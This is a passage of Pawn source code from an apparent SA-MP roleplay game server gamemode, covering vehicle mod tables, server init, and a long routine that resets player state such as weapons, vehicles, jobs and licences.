	vehicleMods[135][10] = {1115, 1116, 1117, 0};
	vehicleMods[135][11] = {1109, 1110, 0, 0};
	vehicleMods[136][2] = {1103, 1128, 0, 0};
	vehicleMods[136][3] = {1108, 0, 0, 0};
	vehicleMods[136][6] = {1104, 1105, 0, 0};
	vehicleMods[136][10] = {1181, 1182, 0, 0};
	vehicleMods[136][11] = {1183, 1184, 0, 0};
	vehicleMods[140][0] = {1001, 1023, 0, 0};
	vehicleMods[140][1] = {1004, 0, 0, 0};
	vehicleMods[140][2] = {1006, 0, 0, 0};
	vehicleMods[140][3] = {1007, 0, 0, 0};
	vehicleMods[140][4] = {1024, 0, 0, 0};
	vehicleMods[140][6] = {1018, 1019, 1020, 0};
	vehicleMods[140][12] = {1143, 1145, 0, 0};
	vehicleMods[142][0] = {1014, 1015, 0, 0};
	vehicleMods[142][6] = {1018, 1019, 1020, 1021};
	vehicleMods[142][12] = {1145, 0, 0, 0};
	vehicleMods[146][0] = {1001, 1002, 1023, 0};
	vehicleMods[146][1] = {1004, 0, 0, 0};
	vehicleMods[146][2] = {1006, 0, 0, 0};
	vehicleMods[146][3] = {1007, 0, 0, 0};
	vehicleMods[146][4] = {1024, 0, 0, 0};
	vehicleMods[146][6] = {1018, 1019, 0, 0};
	vehicleMods[146][12] = {1143, 1145, 0, 0};
	vehicleMods[147][0] = {1000, 1003, 1016, 0};
	vehicleMods[147][6] = {1018, 1019, 1020, 1021};
	vehicleMods[147][12] = {1143, 0, 0, 0};
	vehicleMods[149][0] = {1001, 1003, 1023, 0};
	vehicleMods[149][1] = {1011, 1012, 0, 0};
	vehicleMods[149][3] = {1007, 0, 0, 0};
	vehicleMods[149][6] = {1018, 1019, 1020, 0};
	vehicleMods[149][12] = {1143, 1145, 0, 0};
	vehicleMods[150][0] = {1001, 1003, 1023, 0};
	vehicleMods[150][1] = {1004, 1005, 0, 0};
	vehicleMods[150][2] = {1006, 0, 0, 0};
	vehicleMods[150][6] = {1018, 1019, 1020, 0};
	vehicleMods[150][12] = {1143, 1145, 0, 0};
	vehicleMods[151][0] = {1002, 1003, 1016, 1023};
	vehicleMods[151][1] = {1005, 0, 0, 0};
	vehicleMods[151][2] = {1006, 0, 0, 0};
	vehicleMods[151][6] = {1018, 1019, 1020, 1021};
	vehicleMods[158][0] = {1164, 1163, 0, 0};
	vehicleMods[158][2] = {1088, 1091, 0, 0};
	vehicleMods[158][3] = {1090, 1093, 0, 0};
	vehicleMods[158][6] = {1092, 1089, 0, 0};
	vehicleMods[158][10] = {1166, 1165, 0, 0};
	vehicleMods[158][11] = {1168, 1167, 0, 0};
	vehicleMods[159][0] = {1162, 1158, 0, 0};
	vehicleMods[159][2] = {1067, 1068, 0, 0};
	vehicleMods[159][3] = {1069, 1070, 0, 0};
	vehicleMods[159][6] = {1065, 1066, 0, 0};
	vehicleMods[159][10] = {1160, 1173, 0, 0};
	vehicleMods[159][11] = {1159, 1161, 0, 0};
	vehicleMods[160][0] = {1138, 1139, 0, 0};
	vehicleMods[160][2] = {1032, 1033, 0, 0};
	vehicleMods[160][3] = {1026, 1031, 0, 0};
	vehicleMods[160][6] = {1028, 1029, 0, 0};
	vehicleMods[160][10] = {1169, 1170, 0, 0};
	vehicleMods[160][11] = {1141, 1140, 0, 0};
	vehicleMods[161][0] = {1058, 1060, 0, 0};
	vehicleMods[161][2] = {1055, 1061, 0, 0};
	vehicleMods[161][3] = {1056, 1057, 0, 0};
	vehicleMods[161][6] = {1064, 1059, 0, 0};
	vehicleMods[161][10] = {1155, 1157, 0, 0};
	vehicleMods[161][11] = {1154, 1156, 0, 0};
	vehicleMods[162][0] = {1147, 1146, 0, 0};
	vehicleMods[162][2] = {1035, 1038, 0, 0};
	vehicleMods[162][3] = {1036, 1039, 0, 0};
	vehicleMods[162][6] = {1034, 1037, 0, 0};
	vehicleMods[162][10] = {1171, 1172, 0, 0};
	vehicleMods[162][11] = {1149, 1148, 0, 0};
	vehicleMods[165][0] = {1049, 1050, 0, 0};
	vehicleMods[165][2] = {1054, 1053, 0, 0};
	vehicleMods[165][3] = {1047, 1048, 0, 0};
	vehicleMods[165][6] = {1046, 1045, 0, 0};
	vehicleMods[165][10] = {1153, 1152, 0, 0};
	vehicleMods[165][11] = {1150, 1151, 0, 0};
	vehicleMods[167][2] = {1130, 1131, 0, 0};
	vehicleMods[167][3] = {1133, 0, 0, 0};
	vehicleMods[167][6] = {1129, 1132, 0, 0};
	vehicleMods[167][10] = {1189, 1188, 0, 0};
	vehicleMods[167][11] = {1187, 1186, 0, 0};
	vehicleMods[175][3] = {1042, 0, 0, 0};
	vehicleMods[175][6] = {1044, 1043, 0, 0};
	vehicleMods[175][10] = {1174, 1175, 0, 0};
	vehicleMods[175][11] = {1176, 1177, 0, 0};
	vehicleMods[176][3] = {1137, 1134, 0, 0};
	vehicleMods[176][6] = {1136, 1135, 0, 0};
	vehicleMods[176][10] = {1191, 1190, 0, 0};
	vehicleMods[176][11] = {1192, 1193, 0, 0};
	vehicleMods[180][0] = {1001, 1023, 0, 0};
	vehicleMods[180][2] = {1006, 0, 0, 0};
	vehicleMods[180][3] = {1007, 0, 0, 0};
	vehicleMods[180][6] = {1018, 1020, 0, 0};
	vehicleMods[185][0] = {1001, 1003, 1023, 0};
	vehicleMods[185][2] = {1006, 0, 0, 0};
	vehicleMods[185][3] = {1007, 0, 0, 0};
	vehicleMods[185][4] = {1013, 0, 0, 0};
	vehicleMods[185][6] = {1018, 1019, 1020, 0};
	vehicleMods[185][12] = {1143, 1145, 0, 0};
	vehicleMods[189][0] = {1000, 1016, 0, 0};
	vehicleMods[189][1] = {1005, 1004, 0, 0};
	vehicleMods[189][2] = {1006, 0, 0, 0};
	vehicleMods[189][3] = {1007, 0, 0, 0};
	vehicleMods[189][4] = {1013, 1024, 0, 0};
	vehicleMods[189][6] = {1018, 1020, 0, 0};
	vehicleMods[189][12] = {1145, 0, 0, 0};
	vehicleMods[200][1] = {1004, 1005, 0, 0};
	vehicleMods[200][2] = {1006, 0, 0, 0};
	vehicleMods[200][3] = {1007, 0, 0, 0};
	vehicleMods[200][4] = {1013, 0, 0, 0};
	vehicleMods[200][6] = {1018, 1020, 1022, 0};
	vehicleMods[203][0] = {1001, 1023, 0, 0};
	vehicleMods[203][2] = {1006, 0, 0, 0};
	vehicleMods[203][3] = {1007, 0, 0, 0};
	vehicleMods[203][4] = {1024, 0, 0, 0};
	vehicleMods[203][6] = {1019, 1020, 0, 0};
	vehicleMods[203][12] = {1143, 1145, 0, 0};

	EventInfo[EventRequest] = 999;
	EventInfo[EventCreator] = 999;
	for(new x; x < sizeof(EventInfo[EventStaff]); x++) {
		EventInfo[EventStaff][x] = 999;
	}
	SetVehicleHealth(LSPDVehicles[33], 2500.0);
	SetVehicleHealth(FBIVehicles[12], 2500.0);
	SetVehicleHealth(LSPDVehicles[19], 2500.0);
	SetVehicleHealth(LSPDVehicles[20], 2500.0);
	SetVehicleHealth(LSPDVehicles[21], 2500.0);
	SetVehicleHealth(LSPDVehicles[22], 2500.0);

	//mysql_tquery("TRUNCATE TABLE connections", THREAD_NO_RESULT, 0,sqldb);
	return 1;
}

public OnGameModeExit()
{
	return 1;
}

forward FixHour(hour);
public FixHour(hour)
{
	hour = timeshift + hour;
	if(hour < 0)
	{
		hour = hour+24;
	}
	else if(hour > 23)
	{
		hour = hour-24;
	}
	shifthour = hour;
	return 1;
}

//----------------------[Remove Bomb]-----------------------
forward PickUpC4(playerid);
public PickUpC4(playerid)
{
   	DestroyDynamicObject(PlayerInfo[playerid][pC4]);
   	PlayerInfo[playerid][pC4] = 0;
	return 1;
}

forward SetPlayerFree(playerid,declare,reason[]);
public SetPlayerFree(playerid,declare,reason[])
{
	if(IsPlayerConnected(playerid))
	{
		ClearCrime(playerid);
		new turned[MAX_PLAYER_NAME];
		new turner[MAX_PLAYER_NAME];
		new crbjstore[128];
		if(declare == INVALID_PLAYER_ID)
		{
			format(turner, sizeof(turner), "911");
		}
		else
		{
			if(IsPlayerConnected(declare))
			{
				GetPlayerName(declare, turner, sizeof(turner));
			}
		}
		GetPlayerName(playerid, turned, sizeof(turned));
		foreach(Player, i)
		{
			if(IsACop(i))
			{
				format(crbjstore, sizeof(crbjstore), "HQ: All units, officer %s has completed their assignment.",turner);
				SendClientMessage(i, COLOR_DBLUE, crbjstore);
				format(crbjstore, sizeof(crbjstore), "HQ: %s has been processed, %s.",turned,reason);
				SendClientMessage(i, COLOR_DBLUE, crbjstore);
			}
		}
	}
}

public OnPlayerRequestClass(playerid, classid)
{
	/*SetPlayerPos(playerid, 1958.3783, 1343.1572, 15.3746);
	SetPlayerCameraPos(playerid, 1958.3783, 1343.1572, 15.3746);
	SetPlayerCameraLookAt(playerid, 1958.3783, 1343.1572, 15.3746);*/
	SpawnPlayer(playerid);
	return 1;
}

stock IsStringAlphaNumeric(string[]) {
	new
	    i;

	static const
 		szAppropriateCharacters[] = { "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_" };

	for(new c = 0; c < strlen(string); c++) {
	    for(new f = 0; f < sizeof(szAppropriateCharacters); f++) {
            if(string[c] == szAppropriateCharacters[f])
                i++;
		}
	}

	if(i < strlen(string)) return 0;

	return 1;
}

stock ResetPlayerVariables(playerid) {
	ResetPlayerWeapons(playerid);
	if(AdminDuty[playerid] != 0) {
		TogglePlayerControllable(playerid, 1);
		ClearAnimations(playerid, 1);

		SetPVarInt(playerid, "washereforpaycheck", WasHereForPaycheck[playerid]);
		SetPVarInt(playerid, "signedpaycheck", SignedPaycheck[playerid]);
		SetPVarInt(playerid, "missedpaychecks", MissedPaychecks[playerid]);
		SetPVarInt(playerid, "paycheckcode", PayCheckCode[playerid]);
		SetPVarInt(playerid, "payready", PlayerInfo[playerid][pPayReady]);
		SetPVarInt(playerid, "paycheck", PlayerInfo[playerid][pPayCheck]);
		AdminLoggedInBefore[playerid] = 1;
		AdminDuty[playerid] = 0;
		DeletePVar(playerid, "AdminUndercover");

		new username[MAX_PLAYER_NAME];
		GetPVarString(playerid, "TempNameName", username, sizeof(username));
		SetPVarInt(playerid, "TempName", 0);

		SetPlayerName(playerid, username);
	} else {
		AdminRelogPassword[playerid][0] = 0;
		AdminLoggedInBefore[playerid] = 0;
		for(new i = 0; i < 3; i++)
		{
			TeleportDest[playerid][i] = 0;
		}
		for(new i = 0; i < 3; i++)
		{
			TeleportDest2[playerid][i] = 0;
		}
		IsBoundsShowingFFC[playerid] = 0;
		IsBoundsShowingMP1[playerid] = 0;
		IsBoundsShowingMF1[playerid] = 0;
		IsBoundsShowingMP2[playerid] = 0;
		IsBoundsShowingMF2[playerid] = 0;
		IsBoundsShowingAEC[playerid] = 0;
		IsBoundsShowingDH[playerid] = 0;
		IsBoundsShowingCL[playerid] = 0;
		IsBoundsShowingDF[playerid] = 0;
		GlobalChat[playerid] = 0;
		GlobalChatTimer[playerid] = 0;
		// Start of boombox
		BoomBoxSet[playerid] = 0;
		BoomboxInfo[playerid][bbPosX] = 0.0;
		BoomboxInfo[playerid][bbPosY] = 0.0;
		BoomboxInfo[playerid][bbPosZ] = 0.0;
		BoomboxInfo[playerid][bbInt] = 0;
		BoomboxInfo[playerid][bbVW] = 0;
		BoomboxInfo[playerid][bbStation] = 0;
		BoomboxInfo[playerid][bbSetBy] = 999;
		BoomboxInfo[playerid][bbObject] = 0;
		// End of boombox
		ValidArmor[playerid] = 0;
		ResetPlayerWeapons(playerid);
		// Weapons
		for(new s = 0; s < 12; s++)
		{
			PlayerInfo[playerid][pAGuns][s] = 0; // Admin spawned, non-saved
			PlayerInfo[playerid][pGuns][s] = 0;
		}
		for(new v = 0; v < MAX_PLAYERVEHICLES; v++)
		{
			PlayerVehicleInfo[playerid][v][pvId] = INVALID_PLAYER_VEHICLE_ID;
			PlayerVehicleInfo[playerid][v][pvRealID] = 0;
			PlayerVehicleInfo[playerid][v][pvModelId] = 0;
			PlayerVehicleInfo[playerid][v][pvPosX] = 0.0;
			PlayerVehicleInfo[playerid][v][pvPosY] = 0.0;
			PlayerVehicleInfo[playerid][v][pvPosZ] = 0.0;
			PlayerVehicleInfo[playerid][v][pvPosAngle] = 0.0;
			PlayerVehicleInfo[playerid][v][pvLock] = 0;
			PlayerVehicleInfo[playerid][v][pvLocked] = 0;
			PlayerVehicleInfo[playerid][v][pvPaintJob] = -1;
			PlayerVehicleInfo[playerid][v][pvColor1] = 0;
			PlayerVehicleInfo[playerid][v][pvImpounded] = 0;
			PlayerVehicleInfo[playerid][v][pvSpawned] = 0;
			PlayerVehicleInfo[playerid][v][pvColor2] = 0;
			PlayerVehicleInfo[playerid][v][pvPrice] = 0;
			PlayerVehicleInfo[playerid][v][pvTicket] = 0;
			PlayerVehicleInfo[playerid][v][pvWeapons][0] = 0;
			PlayerVehicleInfo[playerid][v][pvWeapons][1] = 0;
			PlayerVehicleInfo[playerid][v][pvWeapons][2] = 0;
			PlayerVehicleInfo[playerid][v][pvWepUpgrade] = 0;
			PlayerVehicleInfo[playerid][v][pvFuel] = 100.0;
			PlayerVehicleInfo[playerid][v][pvAllowedPlayerId] = INVALID_PLAYER_ID;
			PlayerVehicleInfo[playerid][v][pvPark] = 0;
			ListItemReleaseId[playerid][v] = -1;
			PlayerVehicleInfo[playerid][v][pvDisabled] = 0;
			PlayerVehicleInfo[playerid][v][pvSpawned] = 0;
			format(PlayerVehicleInfo[playerid][v][pvNumberPlate], 32, "");
			ListItemTrackId[playerid][v] = -1;
			for(new m = 0; m < MAX_MODS; m++)
			{
				PlayerVehicleInfo[playerid][v][pvMods][m] = 0;
			}
		}
		for(new v = 0; v < MAX_PLAYERVEHICLES; v++) {
			PlayerVehicleInfo[playerid][v][pvAllowedPlayerId] = INVALID_PLAYER_ID;
		}
	}
	SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL, 1);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_MICRO_UZI, 1);

	DeletePVar(playerid, "PBM");
	DeletePVar(playerid, "PBMK");
	DeletePVar(playerid, "PBMD");
	DeletePVar(playerid, "PBMS");
	DeletePVar(playerid, "Injured");
	DeletePVar(playerid, "EventToken");
	DeletePVar(playerid, "EventAnims");
	SetPVarInt(playerid, "IsInArena", -1);
	SetPVarInt(playerid, "MovingStretcher", -1);
	SetPVarInt(playerid, "editingcd", -1);
	SetPVarInt(playerid, "editingcdveh", -1);

	SetPVarInt(playerid, "AdminUndercover", 0);

	SetPlayerColor(playerid,TEAM_HIT_COLOR);

	if(IsValidDynamic3DTextLabel(Helper[playerid])) DestroyDynamic3DTextLabel(Helper[playerid]);

	// Player file variables (saving)
	if(GetPVarInt(playerid, "attemptLoginAfter") == 0)
		PlayerInfo[playerid][pKey] = 0;

	PlayerInfo[playerid][pID] = 0;
	PlayerInfo[playerid][pLiveBanned] = 0;
	PlayerInfo[playerid][pLevel] = 1;
	PlayerInfo[playerid][pAdmin] = 0;
	format(PlayerInfo[playerid][pAdminName], 32, "0");
	PlayerInfo[playerid][pBanAppealer] = 0;
	PlayerInfo[playerid][pBanned] = 0;
	PlayerInfo[playerid][pPermaBanned] = 0;
	PlayerInfo[playerid][pDisabled] = 0;
	PlayerInfo[playerid][pIP] = 0;
	PlayerInfo[playerid][pReg] = 0;
	PlayerInfo[playerid][pTut] = 0;
	PlayerInfo[playerid][pSex] = 1;
	PlayerInfo[playerid][pGangMod] = 0;
	PlayerInfo[playerid][pAge] = 0;
	PlayerInfo[playerid][pSkin] = 299;
	PlayerInfo[playerid][pPos_x] = 0;
	PlayerInfo[playerid][pPos_y] = 0;
	PlayerInfo[playerid][pPos_z] = 3.14;
	PlayerInfo[playerid][pPos_r] = 0;
	PlayerInfo[playerid][pConnectTime] = 0;
	PlayerInfo[playerid][pRespect] = 0;
	PlayerInfo[playerid][pNumber] = 0;
	PlayerInfo[playerid][pWarns] = 0;
	PlayerInfo[playerid][pGang] = 255;
	PlayerInfo[playerid][pTriageTime] = 0;
	PlayerInfo[playerid][pFaction] = 0;
	PlayerInfo[playerid][pLeader] = 0;
	PlayerInfo[playerid][pRank] = 0;
	PlayerInfo[playerid][pJob] = 0;
	PlayerInfo[playerid][pJob2] = 0;
	PlayerInfo[playerid][pVip] = 0;
	PlayerInfo[playerid][gPupgrade] = 0;
	PlayerInfo[playerid][pSarmor] = 0;
	PlayerInfo[playerid][pCash] = 100;
	TalkingLive[playerid] = INVALID_PLAYER_ID;
	PlayerInfo[playerid][pBank] = 100;
	PlayerInfo[playerid][pInsurance] = 0;
	PlayerInfo[playerid][pCrimes] = 0;
	PlayerInfo[playerid][pArrested] = 0;
	PlayerInfo[playerid][pWantedLevel] = 0;
	PlayerInfo[playerid][pHealth] = 100;
	PlayerInfo[playerid][pArmor] = 0;
	PlayerInfo[playerid][pPot] = 0;
	PlayerInfo[playerid][pCrack] = 0;
	PlayerInfo[playerid][pPackages] = 0;
	PlayerInfo[playerid][pCrates] = 0;
	PlayerInfo[playerid][pRadio] = 0;
	PlayerInfo[playerid][pRadioFreq] = 0;
	PlayerInfo[playerid][pMats] = 0;
	PlayerInfo[playerid][pRope] = 0;
	PlayerInfo[playerid][pCigar] = 0;
	PlayerInfo[playerid][pSprunk] = 0;
	PlayerInfo[playerid][pSpraycan] = 0;
	PlayerInfo[playerid][pHouse] = INVALID_HOUSE_ID;
	PlayerInfo[playerid][pHouse2] = INVALID_HOUSE_ID;
	PlayerInfo[playerid][pRenting] = INVALID_HOUSE_ID;
	PlayerInfo[playerid][pInt] = 0;
	PlayerInfo[playerid][pVW] = 0;
	PlayerInfo[playerid][pJailed] = 0;
	PlayerInfo[playerid][pJailTime] = 0;
	PlayerInfo[playerid][pPayCheck] = 0;
	PlayerInfo[playerid][pPayReady] = 0;
	PlayerInfo[playerid][pDetSkill] = 0;
	PlayerInfo[playerid][pLawSkill] = 0;
	PlayerInfo[playerid][pSexSkill] = 0;
	PlayerInfo[playerid][pDrugsSkill] = 0;
	PlayerInfo[playerid][pSmugSkill] = 0;
	PlayerInfo[playerid][pArmsSkill] = 0;
	PlayerInfo[playerid][pMechSkill] = 0;
	PlayerInfo[playerid][pFishSkill] = 0;
	PlayerInfo[playerid][pBoxSkill] = 0;
	PlayerInfo[playerid][pTruckSkill] = 0;
	PlayerInfo[playerid][pCarSkill] = 0;
	PlayerInfo[playerid][pLawyerTime] = 0;
	PlayerInfo[playerid][pLawyerFreeTime] = 0;
	PlayerInfo[playerid][pDrugsTime] = 0;
	PlayerInfo[playerid][pMechTime] = 0;
	PlayerInfo[playerid][pSexTime] = 0;
	PlayerInfo[playerid][pCarTime] = 0;
	PlayerInfo[playerid][pFishes] = 0;
	PlayerInfo[playerid][pBiggestFish] = 0;
	PlayerInfo[playerid][pWeedObject] = 0;
	PlayerInfo[playerid][pWeedPos][0] = 0;
	PlayerInfo[playerid][pWeedPos][1] = 0;
	PlayerInfo[playerid][pWeedPos][2] = 0;
	PlayerInfo[playerid][pWeedVW] = 0;
	PlayerInfo[playerid][pWeedInt] = 0;
	PlayerInfo[playerid][pWeedGrowth] = -1;
	PlayerInfo[playerid][pWSeeds] = 0;
	PlayerInfo[playerid][pFightStyle] = FIGHT_STYLE_NORMAL;
	PlayerInfo[playerid][pScrewdriver] = 0;
	PlayerInfo[playerid][pSmslog] = 0;
	PlayerInfo[playerid][pWristwatch] = 0;
	PlayerInfo[playerid][pTire] = 0;
	PlayerInfo[playerid][pFirstaid] = 0;
	PlayerInfo[playerid][pRccam] = 0;
	PlayerInfo[playerid][pReceiver] = 0;
	PlayerInfo[playerid][pGPS] = 0;
	PlayerInfo[playerid][pSweep] = 0;
	PlayerInfo[playerid][pSweepLeft] = 0;
	PlayerInfo[playerid][pVehicleKeys] = INVALID_PLAYER_VEHICLE_ID; // non-saved
	PlayerInfo[playerid][pVehicleKeysFrom] = INVALID_PLAYER_ID; // non-saved
	PlayerInfo[playerid][pCarLic] = 0;
	PlayerInfo[playerid][pFlyLic] = 0;
	PlayerInfo[playerid][pBoatLic] = 1;
	PlayerInfo[playerid][pFishLic] = 1;
	PlayerInfo[playerid][pGunLic] = 1;
	PlayerInfo[playerid][pDivision] = 0;
	PlayerInfo[playerid][pTicketTime] = 0;
	PlayerInfo[playerid][pHeadValue] = 0;
	strcpy(PlayerInfo[playerid][pContractBy], "Nobody", 64);
	strcpy(PlayerInfo[playerid][pContractDetail], "None", 64);
	PlayerInfo[playerid][pC4] = 0;
	PlayerInfo[playerid][pC4Used] = 0;
	PlayerInfo[playerid][pBombs] = 0;
	PlayerInfo[playerid][pCHits] = 0;
	PlayerInfo[playerid][pFHits] = 0;
	strcpy(PlayerInfo[playerid][pPrisonedBy], "Nobody", 64);
	strcpy(PlayerInfo[playerid][pPrisonReason], "None", 64);
	PlayerInfo[playerid][pAcceptReport] = 0;
	PlayerInfo[playerid][pTrashReport] = 0;
	PlayerInfo[playerid][pAccent] = 0;
	PlayerInfo[playerid][pNMute] = 0;
	PlayerInfo[playerid][pNMuteTotal] = 0;
	PlayerInfo[playerid][pADMute] = 0;
	PlayerInfo[playerid][pADMuteTotal] = 0;
	PlayerInfo[playerid][pRMuted] = 0;
	PlayerInfo[playerid][pRMutedTotal] = 0;
	PlayerInfo[playerid][pRMutedTime] = 0;
	PlayerInfo[playerid][pSpeedo] = 0;
	PlayerInfo[playerid][pGCMuted] = 0;
	PlayerInfo[playerid][pGCMutedTime] = 0;
	PlayerInfo[playerid][pCallsAccepted] = 0;
	PlayerInfo[playerid][pPatientsDelivered] = 0;
	PlayerInfo[playerid][pTriageTime] = 0;




	PlayerInfo[playerid][pVip] = 0;
	PlayerInfo[playerid][pVIPTokens] = 0;



	for(new v = 0; v < MAX_PLAYERTOYS; v++)
	{
		PlayerToyInfo[playerid][v][ptModelID] = 0;
		PlayerToyInfo[playerid][v][ptBone] = 1;
        PlayerToyInfo[playerid][v][ptRealID] = 0;
		PlayerToyInfo[playerid][v][ptPosX] = 0.0;
		PlayerToyInfo[playerid][v][ptPosY] = 0.0;
		PlayerToyInfo[playerid][v][ptPosZ] = 0.0;
		PlayerToyInfo[playerid][v][ptRotX] = 0.0;
		PlayerToyInfo[playerid][v][ptRotY] = 0.0;
		PlayerToyInfo[playerid][v][ptRotZ] = 0.0;
		PlayerToyInfo[playerid][v][ptScaleX] = 1.0;
		PlayerToyInfo[playerid][v][ptScaleY] = 1.0;
		PlayerToyInfo[playerid][v][ptScaleZ] = 1.0;
	}
	PlayerInfo[playerid][pKillLog0][0] = 0;
	PlayerInfo[playerid][pKillLog1][0] = 0;
	PlayerInfo[playerid][pKillLog2][0] = 0;
	PlayerInfo[playerid][pKillLog3][0] = 0;
	PlayerInfo[playerid][pKillLog4][0] = 0;
	PlayerInfo[playerid][pKillLog5][0] = 0;
	PlayerInfo[playerid][pKillLog6][0] = 0;
	PlayerInfo[playerid][pKillLog7][0] = 0;
	PlayerInfo[playerid][pKillLog8][0] = 0;
	PlayerInfo[playerid][pRMutedTime] = 0;
	PlayerInfo[playerid][pRMutedTotal] = 0;
	PlayerInfo[playerid][pPatientsDelivered] = 0;
	PlayerInfo[playerid][pKillLog9][0] = 0;
	strcpy(PlayerInfo[playerid][pFlag], "", 128);
	strcpy(PlayerInfo[playerid][pReferredBy], "0", 32);
	PlayerInfo[playerid][pRefTokens] = 0;
    PlayerInfo[playerid][pRefTokensOffline] = 0;
    PlayerInfo[playerid][pHelper] = 0;
	PlayerInfo[playerid][pWalkStyle] = 0;

	// Other player variables (non-saving)
	for(new s = 0; s < 40; s++)
	{
		ListItemReportId[playerid][s] = -1;
	}
	for(new i = 0; i < 6; i++)
	{
		HHcheckFloats[playerid][i] = 0;
	}
	HHcheckInt[playerid] = 0;
	HHcheckVW[playerid] = 0;
	for(new i = 0; i < 3; i++) {
		StopaniFloats[playerid][i] = 0;
	}
	SetPVarInt(playerid, "NameChangeCost", 0);
	JustSuicided[playerid] = 0;
	HelperPM[playerid] = INVALID_PLAYER_ID;
	SpeakerPhone[playerid] = 0;
	LastSMS[playerid] = 0;
	PlayerDragged[playerid] = 0;
	PlayerDraggedBy[playerid] = INVALID_PLAYER_ID;
	IsCopDragging[playerid] = INVALID_PLAYER_ID;
	PaintballTeam[playerid] = 0;
	EventTeam[playerid] = -1;
	TeleportDestInt[playerid] = 0;
	TeleportDestInt2[playerid] = 0;
	gPlayerAccount[playerid] = 0;
	gPlayerLogTries[playerid] = 0;
	gPlayerLogged[playerid] = 0;
	InsideMainMenu[playerid] = 1;
	InsideTut[playerid] = 1;
	ActiveChatbox[playerid] =  0;
	PlayerCuffed[playerid] = 0;
	Spectate[playerid] = 999;
	Spectating[playerid] = 0;
	GettingSpectated[playerid] = 999;
	InsideShamal[playerid]= INVALID_VEHICLE_ID;
	HouseOffer[playerid] = 999;
	House[playerid] = 0;
	HousePrice[playerid] = 0;
	hInviteHouse[playerid]=INVALID_HOUSE_ID;
	hInviteOffer[playerid]=999;
	playerTabbed[playerid] = 0;
 	playerTabbedTime[playerid] = 0;
	playerAFK[playerid] = 0;
	playerAFKTime[playerid] = 0;
	playerLastTyped[playerid] = 0;
	pCurrentWeapon[playerid] = 0;
	JetPack[playerid] = 0;
	TextSpamTimes[playerid] = 0;
	TextSpamUnmute[playerid] = 0;
 	CommandSpamTimes[playerid] = 0;
	CommandSpamUnmute[playerid] = 0;
	gLastCar[playerid] = 0;
	LiveOffer[playerid] = INVALID_PLAYER_ID;
	IsTheReporter[playerid] = 0;
	GettingJob[playerid] = 0;
	GettingJob2[playerid] = 0;
	PayCheckCode[playerid] = 0;
	AdminDuty[playerid] = 0;
	FindTimePoints[playerid] = 0;
	FindingPlayer[playerid] = 0;
	FindTime[playerid] = 0;
	UsedFind[playerid] = 0;
	Condom[playerid] = 0;
	SexOffer[playerid] = 999;
	SexPrice[playerid] = 0;
	gFam[playerid] = 0;
	InviteOffer[playerid]=999;
	InviteFaction[playerid]=0;
	InviteFamily[playerid]=255;
	PotOffer[playerid] = 999;
	CrackOffer[playerid] = 999;
	PotPrice[playerid]=0;
	CrackPrice[playerid]=0;
	PotGram[playerid]=0;
	CrackGram[playerid]=0;
	JobDuty[playerid]=0;
	WantLawyer[playerid]=0;
	CallLawyer[playerid]=0;
	JailPrice[playerid]=0;
	DefendOffer[playerid] = 999;
	DefendPrice[playerid] = 0;
	CP[playerid] = 0;
	GuardOffer[playerid] = 999;
 	GuardPrice[playerid]=0;
 	GunOffer[playerid] = 999;
  	GunId[playerid] = 0;
   	GunMats[playerid] = 0;
	MatsOffer[playerid] = 999;
	MatsPrice[playerid] = 0;
	MatsAmount[playerid] = 0;
	PlayerBoxing[playerid]=0;
	BoxOffer[playerid] = 999;
	BoxWaitTime[playerid]=0;
	UsedCrack[playerid] = 0;
	UsedWeed[playerid] = 0;
	PlayerStoned[playerid] = 0;
	TransportDuty[playerid]=0;
	TransportValue[playerid] = 0;
	TransportMoney[playerid] = 0;
	TransportTime[playerid] = 0;
	TransportCost[playerid] = 0;
	TransportDriver[playerid] = 999;
	ConsumingMoney[playerid] = 0;
	BusCallTime[playerid]=0;
	BusAccepted[playerid] = 999;
	TaxiCallTime[playerid]=0;
	TaxiAccepted[playerid] = 999;
	DrinkOffer[playerid] =  INVALID_PLAYER_ID;
	Fishes[playerid][pLastFish] = 0;
	Fishes[playerid][pFishID] = 0;
	FishCount[playerid]=0;
	CraftOffer[playerid] = 999;
	CraftId[playerid]=0;
	CraftMats[playerid]=0;
	VehicleSpawned[playerid] = 0;
	VehicleOffer[playerid] = 999;
	VehiclePrice[playerid] = 0;
	VehicleId[playerid] = -1;
	GiveKeysTo[playerid] = INVALID_PLAYER_ID;
	HouseKey[playerid] = INVALID_HOUSE_ID;
	RepairCar[playerid]=0;
	OnDuty[playerid]=0;
	ConnectedToPC[playerid]=0;
	PlayerCuffedTime[playerid]=0;
	PhoneOnline[playerid] = 0;
	pTazer[playerid] = 0;
	pTazerReplace[playerid] = 0;
	TazerTimeout[playerid] = 0;
	TicketOffer[playerid] = 999;
	TicketMoney[playerid] = 0;
	arr_Towing[playerid] = INVALID_VEHICLE_ID;
	Fixr[playerid] = 0;
	gBug[playerid] = 1;
	GotHit[playerid]=0;
	GoChase[playerid]=999;
	GetChased[playerid]=999;
	HitOffer[playerid]=999;
	HitToGet[playerid]=999;
	JustReported[playerid] = -1;
	CancelReport[playerid] = -1;
	NewbieTimer[playerid] = 0;
	gNewbie[playerid] = 0;
	for(new i = 0; i < 6; i++) {
	    EventFloats[playerid][i] = 0.0;
	}
	EventLastInt[playerid] = 0; EventLastVW[playerid] = 0;
	Mobile[playerid]=INVALID_PLAYER_ID;
	CellTime[playerid] = 0;
	CalledCops[playerid]=0;
	CopsCallTime[playerid]=0;
	CalledMedics[playerid]=0;
	MedicsCallTime[playerid]=0;
	Music[playerid]=0;
	PlayerTied[playerid]=0;
	gRadio[playerid] = 1;
	CallCost[playerid] = 0;
    szAdvert[playerid][0] = 0;
	LoadTruckBar[playerid] = INVALID_BAR_ID;
	LoadTruckTime[playerid] = 0;
	TruckDeliver[playerid] = 0;
	TruckUsed[playerid] = INVALID_VEHICLE_ID;
	EMSCallTime[playerid]=0;
	EMSAccepted[playerid]=INVALID_PLAYER_ID;
	MedicCallTime[playerid]=0;
	MedicAccepted[playerid] = 999;
	MechanicCallTime[playerid]=0;
	DivorceOffer[playerid] = 999;
	MarryWitness[playerid] = 999;
	MarryWitnessOffer[playerid] = 999;
	MarriageCeremoney[playerid] = 0;
	ProposeOffer[playerid] = 999;
	ProposedTo[playerid] = 999;
	GotProposedBy[playerid] = 999;
	slotselection[playerid] = 0;
	ServiceTime[playerid] = 0;
	WasHereForPaycheck[playerid] = 0;
	SignedPaycheck[playerid] = 0;
